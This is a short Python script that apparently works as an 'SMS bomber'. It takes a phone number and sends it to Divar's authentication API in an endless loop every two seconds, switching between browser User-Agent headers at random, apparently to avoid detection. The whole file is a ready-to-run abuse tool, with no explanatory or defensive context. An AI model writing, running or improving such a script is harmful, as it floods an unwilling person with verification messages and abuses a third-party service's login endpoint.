import requests
import random
import time


number = input("Enter number (937.........) :")
url_divar = "	https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

heads = [
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]

while True:
    random_head = random.choice(heads)
    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print("divar",req_divar)
    time.sleep(2)